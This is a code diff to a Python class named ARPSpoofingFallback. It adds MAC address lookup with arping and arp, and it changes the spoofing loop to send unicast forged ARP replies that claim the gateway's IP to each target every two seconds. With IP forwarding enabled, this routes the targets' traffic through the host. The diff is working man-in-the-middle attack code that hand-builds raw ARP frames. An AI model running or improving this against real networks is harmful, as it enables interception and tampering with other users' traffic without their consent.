@@ -1682,6 +1682,46 @@ class ARPSpoofingFallback:
             else:
                 self.real_gateway_mac = match.group(1)
 
+            # Resolve target MAC addresses for unicast ARP spoofing (avoids switch ignoring broadcast ARP)
+            add_log('info', f'Resolving MAC addresses for {len(targets)} target(s) (unicast ARP spoofing)')
+            self.target_macs = {}  # Map target_ip → target_mac
+            for target_ip in targets:
+                mac = None
+                try:
+                    # Try arping first (more reliable for live hosts)
+                    try:
+                        result = subprocess.check_output(
+                            ['arping', '-c', '1', '-w', '1', target_ip],
+                            stderr=subprocess.PIPE, text=True, timeout=3
+                        )
+                        # arping output: "Unicast reply from X [YY:YY:YY:YY:YY:YY]"
+                        match = re.search(r'\[([0-9a-fA-F:]{17})\]', result)
+                        if match:
+                            mac = match.group(1)
+                    except:
+                        pass
+
+                    # Fallback: use arp -n command
+                    if not mac:
+                        result = subprocess.check_output(
+                            ['arp', '-n', target_ip],
+                            stderr=subprocess.PIPE, text=True, timeout=2
+                        )
+                        # arp output: "... at YY:YY:YY:YY:YY:YY [ether]"
+                        match = re.search(r'([0-9a-fA-F:]{17})', result)
+                        if match:
+                            mac = match.group(1)
+
+                    if mac:
+                        self.target_macs[target_ip] = mac
+                        add_log('dev', f'Target {target_ip} → MAC {mac} (unicast ARP will be used)')
+                    else:
+                        add_log('warn', f'Could not resolve MAC for {target_ip}; will use broadcast fallback for this target')
+                        self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
+                except Exception as e:
+                    add_log('warn', f'Error resolving MAC for {target_ip}: {e}; using broadcast fallback')
+                    self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
+
             # Enable IP forwarding
             self._enable_ip_forwarding()
 
@@ -1753,6 +1793,7 @@ class ARPSpoofingFallback:
         """Continuously send ARP replies claiming to be the gateway.
 
         This makes target devices think we are the gateway, routing traffic through us.
+        Uses unicast ARP when MAC is known (preferred), broadcast as fallback.
         """
         try:
             # Build ARP reply packet: we claim to own the gateway IP
@@ -1762,25 +1803,38 @@ class ARPSpoofingFallback:
             while self.active:
                 for target_ip in targets:
                     try:
-                        # ARP reply: we are gateway_ip
-                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
+                        # Get target MAC for unicast ARP (or use broadcast if unknown)
+                        target_mac = self.target_macs.get(target_ip, 'ff:ff:ff:ff:ff:ff')
+
+                        # ARP reply: we are gateway_ip, send unicast to target
+                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip, target_mac)
                         success, method, error = SocketProxy.send_packet(packet, iface)
                         if not success:
-                            add_log('warn', f'ARP spoof to {target_ip} failed ({method}): {error}')
+                            add_log('warn', f'ARP spoof to {target_ip} ({target_mac}) failed ({method}): {error}')
                         else:
-                            add_log('dev', f'ARP spoof to {target_ip} via {method}')
+                            pkt_type = 'unicast' if target_mac != 'ff:ff:ff:ff:ff:ff' else 'broadcast'
+                            add_log('dev', f'ARP spoof to {target_ip} ({pkt_type}) via {method}')
                     except Exception as e:
                         add_log('warn', f'ARP spoof to {target_ip} exception: {e}')
 
-                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
+                time.sleep(2)  # Re-spoof every 2 seconds to maintain ARP cache
 
         except Exception as e:
             add_log('error', f'ARP spoofing loop failed: {e}')
 
-    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
-        """Build raw ARP reply packet."""
+    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str, target_mac_str: str = 'ff:ff:ff:ff:ff:ff') -> bytes:
+        """Build raw ARP reply packet.
+
+        Args:
+            src_mac: Our MAC address as bytes
+            gateway_ip: Gateway IP we're spoofing
+            target_ip: Target device IP
+            target_mac_str: Target MAC address (unicast) or 'ff:ff:ff:ff:ff:ff' (broadcast fallback)
+        """
+        # Parse target MAC (unicast or broadcast)
+        dst_mac = bytes.fromhex(target_mac_str.replace(':', ''))
+
         # Ethernet header
-        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
         frame_type = struct.pack('!H', 0x0806)  # ARP
 
         # ARP packet
@@ -1788,15 +1842,17 @@ class ARPSpoofingFallback:
         proto_type = struct.pack('!H', 0x0800)  # IPv4
         hw_len = struct.pack('!B', 6)  # MAC length
         proto_len = struct.pack('!B', 4)  # IP length
-        operation = struct.pack('!H', 2)  # Reply
+        operation = struct.pack('!H', 2)  # Reply (not Request)
 
         # Convert IPs to bytes
         gw_bytes = socket.inet_aton(gateway_ip)
         target_bytes = socket.inet_aton(target_ip)
 
+        # ARP reply: sender = us (claiming to be gateway), target = destination device
         arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
                       src_mac + gw_bytes + dst_mac + target_bytes)
 
+        # Ethernet frame: [dst_mac][src_mac][frame_type][arp_packet]
         return dst_mac + src_mac + frame_type + arp_packet
 
     def disable_arp_spoofing(self):
